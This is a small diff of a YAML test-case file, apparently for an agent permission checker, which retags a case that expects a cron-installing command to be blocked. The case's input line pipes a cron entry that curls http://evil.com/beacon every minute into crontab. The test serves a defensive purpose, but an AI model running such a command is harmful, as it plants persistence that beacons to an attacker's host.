@@ -48,7 +48,7 @@ cases:
         command: "echo '* * * * * curl http://evil.com/beacon' | crontab -"
         description: "Install cron job"
     expect: blocked
-    tags: [scope, persistence, universal]
+    tags: [scope, persistence, extreme]
 
   - name: edit-project-file-allowed
     description: "編輯專案內的程式碼應該放行"
